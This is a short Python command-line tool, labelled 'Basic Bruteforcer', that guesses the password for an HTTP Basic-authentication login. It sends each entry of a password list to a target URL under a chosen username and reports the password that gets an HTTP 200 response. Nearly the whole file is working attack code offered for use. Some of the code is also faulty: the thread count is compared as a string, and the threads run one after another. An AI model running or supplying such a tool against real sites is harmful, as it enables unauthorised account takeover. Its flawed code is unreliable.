import requests
from threading import Thread
import sys
import getopt
from os import system, name

global hit
hit = "1"

def clear(): 
	if name == 'nt':
		_ = system('cls')  
	else:
		_ = system('clear')

def banner():
	clear()
	print ("######################################################################################################")
	print ("#                                                                                                    #")
	print ("#                       Basic Bruteforcer                                                            #")
	print ("#                                        - script-beast                                              #")
	print ("#                                                                                                    #")
	print ("######################################################################################################")

def usage():
	banner()
	print (" Usage :")
	print ("         -w : url")
	print ("         -u : username")
	print ("         -t : threads")
	print ("         -f : password list")
	print ("\n Example : python brutefpy.py -w http://abcxyz.com -u admin -t 4 -f pass.txt")

class request_performer(Thread):
	def __init__(self,name,user,url) :
		Thread.__init__(self)
		self.password = name.split("\n")[0]
		self.username = user
		self.url = url
		print("-" + self.password + "-")
	
	def run(self) :
		global hit
		if hit == "1" :
			try :
				r = requests.get(self.url, auth=(self.username, self.password))
				if r.status_code == 200 :
					hit = "0"
					print ("[+] Password Found -" + self.password)
					sys.exit()
				else :
					print ("[!!] -" + self.password + "is not Valid")
					i[0] = i[0] - 1
			except Exception as e :
				print (e)


def start(argv):
	banner()
	try :
		opts,args = getopt.getopt(argv, "u:w:f:t:h")
	except :
		print (" Error on arguments \n Type 'python brutefpy.py -h'")
		sys.exit()
	
	for opt,arg in opts:
		if opt == "-h" :
			usage()
			sys.exit()
		if opt == '-u' :
			user = arg
		elif opt == '-w' :
			url = arg
		elif opt == "-f" :
			dictio = arg
		elif opt == "-t" :
			threads = arg
	
	try :
		f = open(str(dictio) , "r")
		passwords = f.readlines()
	except :
		print ("[!!] Can't open That File")
		sys.exit()
		
	launcher_thread(passwords,threads,user,url)

def launcher_thread(passwords,th,username,url) :
	global i
	i = []
	i.append(0)
	while len(passwords):
		if hit == "1" :
			try :
				if i[0] < th :
					passwd = passwords.pop(0)
					i[0] = i[0] + 1
					thread = request_performer(passwd, username, url)
					thread.start()
			except KeyboardInterrupt :
				print ("Interrupted !!!!!")
				sys.exit()
			thread.join()


if __name__ == "__main__" :
	try :
		start(sys.argv[1:])
	except KeyboardInterrupt :
		print ("Interrupted !!!!!")